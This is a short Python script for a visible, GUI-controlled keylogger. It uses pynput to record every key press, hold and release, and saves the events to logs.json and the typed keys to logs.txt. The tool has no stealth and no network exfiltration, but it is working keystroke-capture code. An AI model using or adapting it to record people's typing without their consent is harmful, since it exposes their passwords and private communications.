from pynput import keyboard
import json
import tkinter as tk
from tkinter import *
import threading

root = tk.Tk()
root.geometry("300x200")
root.title("Keyboard Logger")

key_list = []
x = False
key_strokes = ""
listener = None  # Global listener variable

def update_txt_file(key):
    with open("logs.txt", "w+") as key_strokes:
        key_strokes.write(key)

def update_json_file(key_list):
    with open('logs.json', 'w+') as key_strokes:
        key_list_str = json.dumps(key_list)
        key_strokes.write(key_list_str)

def on_press(key):
    global x
    global key_list
    if x == False:
        key_list.append(
            {"Pressed": f'{key}'}
        )
    x = True
    if x == True:
        key_list.append(
            {"Held": f'{key}'}
        )
    update_json_file(key_list)

def on_release(key):
    global x
    global key_list, key_strokes
    key_list.append(
        {"Released": f'{key}'}
    )
    if x == True:
        x = False
    update_json_file(key_list)
    key_strokes += str(key)
    update_txt_file(key_strokes)

def start_keylogger():
    global listener
    print("[+] Running Keylogger Successfully\n[!] Saving the key logs in 'logs.json'")
    listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    )
    listener.start()
    listener.join()

def start_keylogger_thread():
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

def stop_keylogger():
    if listener:
        listener.stop()
        print("[!] Keylogger stopped.")

# Improving the GUI layout
header = Label(root, text="Keylogger", font="Verdana 14 bold")
header.pack(pady=10)

start_button = Button(root, text="Start Keylogger", command=start_keylogger_thread, width=20, bg="green", fg="white")
start_button.pack(pady=10)

stop_button = Button(root, text="Stop Keylogger", command=stop_keylogger, width=20, bg="red", fg="white")
stop_button.pack(pady=10)

info_label = Label(root, text="Logs will be saved in logs.txt and logs.json", font="Verdana 10")
info_label.pack(pady=10)

root.mainloop()
